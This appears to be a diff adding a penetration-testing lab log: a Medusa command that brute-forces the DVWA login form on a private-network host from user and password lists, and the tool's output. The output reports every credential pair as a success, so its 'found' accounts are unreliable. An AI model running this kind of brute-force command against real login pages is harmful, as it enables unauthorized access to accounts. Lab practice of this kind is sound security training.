@@ -1,0 +1,39 @@
+# medusa -h 192.168.100.98  -U users.txt -P pass.txt -M http \
+    -m PAGE:'/dvwa/login.php' \
+    -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+    -m 'FAIL=Login failed' -t 6 > resultado_http.txt
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: user Password: msfadmin [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: password (2 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: user Password: password [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: msfadmin (2 of 4, 3 complete) Password: 123456 (1 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: msfadmin Password: 123456 [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: password (2 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: msfadmin Password: password [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: msfadmin (3 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: user (1 of 4, 6 complete) Password: 123456 (3 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: user Password: 123456 [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: admin (3 of 4, 7 complete) Password: password (1 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: admin Password: password [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: msfadmin (2 of 4, 8 complete) Password: qwerty (4 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: msfadmin Password: qwerty [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: admin (3 of 4, 9 complete) Password: 123456 (2 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: admin Password: 123456 [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: user (1 of 4, 10 complete) Password: qwerty (4 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: user Password: qwerty [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: admin (3 of 4, 11 complete) Password: qwerty (3 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: admin Password: qwerty [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: admin (3 of 4, 13 complete) Password: msfadmin (4 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: admin Password: msfadmin [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: root (4 of 4, 14 complete) Password: 123456 (1 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: root Password: 123456 [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: root (4 of 4, 15 complete) Password: password (2 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: root Password: password [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: root (4 of 4, 16 complete) Password: qwerty (3 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: root Password: qwerty [SUCCESS]
+2026-11-22 13:19:38 ACCOUNT CHECK: [http] Host: 192.168.100.98 (1 of 1, 0 complete) User: root (4 of 4, 17 complete) Password: msfadmin (4 of 4 complete)
+2026-11-22 13:19:38 ACCOUNT FOUND: [http] Host: 192.168.100.98 User: root Password: msfadmin [SUCCESS]
